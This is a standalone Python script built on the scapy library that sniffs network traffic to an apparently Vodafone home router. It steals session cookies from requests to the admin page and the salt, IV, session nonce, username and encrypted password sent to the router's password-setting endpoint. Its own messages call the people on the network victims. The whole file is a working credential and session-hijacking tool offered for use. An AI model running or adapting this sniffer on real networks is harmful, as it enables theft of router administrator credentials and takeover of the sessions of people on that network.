#!/usr/bin/env python3

import os
import sys
import json
from scapy.all import *

if len(sys.argv) != 3: exit(sys.argv[0] + ": [ interface ] [ router ]")

if os.getuid() != 0: exit(sys.argv[0] + ": Permission denied.")

interface = sys.argv[1]
router_ip = sys.argv[2]

cache = {}

def process_packet(packet) -> None:
	if not packet.haslayer(IP) or not packet.haslayer(TCP): return

	Ether_l = packet.getlayer(Ether)
	IP_l = packet.getlayer(IP)
	TCP_l = packet.getlayer(TCP)

	if not TCP_l.haslayer(Raw): return
	try: load = TCP_l[Raw].load.decode()
	except UnicodeError: return

	if IP_l.src != router_ip and IP_l.dst != router_ip: return

	if IP_l.src != router_ip:
		victim_ip = IP_l.src
		victim_mac = str(Ether_l.src)

		if load.startswith("GET /"):
			if load[5] != " ": uri = load[4:].split(" ")[0]
			else: uri = "/"

			if uri != "/": return

			print("[*] " + victim_ip + " (" + victim_mac + ") -> " + router_ip + " HTTP GET " + uri)
			if "Cookie: " in load:
				print("[+] Sniffed cookie for " + victim_ip + ": " + load[load.find("Cookie: ") + 8:].split("\r\n")[0])

		if load.startswith("POST /"):
			if load[5:].startswith("/php/ajaxSet_Password.php"):
				print("[+] " + victim_ip + " (" + victim_mac + ") -> " + router_ip + " HTTP POST /php/ajaxSet_Password.php")

				data = json.loads(load.split("\n")[-1])

				encrypt_data = data["EncryptData"]
				username = data["Name"]
				
				try:
					cache[victim_ip]["myIv"]
					cache[victim_ip]["mySalt"]
				except KeyError:
					print("[-] Var cache for " + victim_ip + " incomplete. Couldn't sniff salt and iv.")
					return

				if cache[victim_ip]["myIv"] == "" or cache[victim_ip]["mySalt"] == "":
					print("[-] Var cache for " + victim_ip + " incomplete. Couldn't sniff salt and iv.")
					return

				print("=" * 75)
				
				print("[+] Salt: " + cache[victim_ip]["mySalt"])
				print("[+] IV: " + cache[victim_ip]["myIv"])
				print("[+] Nonce: " + cache[victim_ip]["currentSessionId"])
				print("[+] EncryptData: " + encrypt_data)
				print("[+] Username: " + username)

				print("=" * 75)

	else:
		victim_ip = IP_l.dst
		victim_mac = str(Ether_l.dst)

		if "var mySalt = '" in load:
			vars_start = load[load.find("var encryptflag"):]
			unparsed_vars = vars_start[:vars_start.find("</script>")]
			
			unparsed_vars_splitted = unparsed_vars.split(";\n")
			if len(unparsed_vars) != 0:
				cache[victim_ip] = {}

			for unparsed_var in unparsed_vars.split(";\n"):
				parsed_var = unparsed_var.replace("var ", "")

				var_name = parsed_var[:parsed_var.find(" = ")]
				var_content = parsed_var[parsed_var.find(" = ") + 4:][:-1]

				cache[victim_ip][var_name] = var_content

				if var_name in ["mySalt", "myIv", "currentSessionId", "encryptflag"]:
					print("[*] Sniffed var '" + var_name + "' for " + victim_ip + ": '" + var_content + "' and added to var cache.")

		if "{\"p_status\":\"Lockout\",\"p_waitTime\"" in load:
			print("[-] Login for " + victim_ip + " (" + victim_mac + ") failed!")

print("[+] Starting Vodafone HTTP credential/session sniffer... Waiting for victims...")

try: sniff(iface=interface, prn=process_packet)
except KeyboardInterrupt: pass

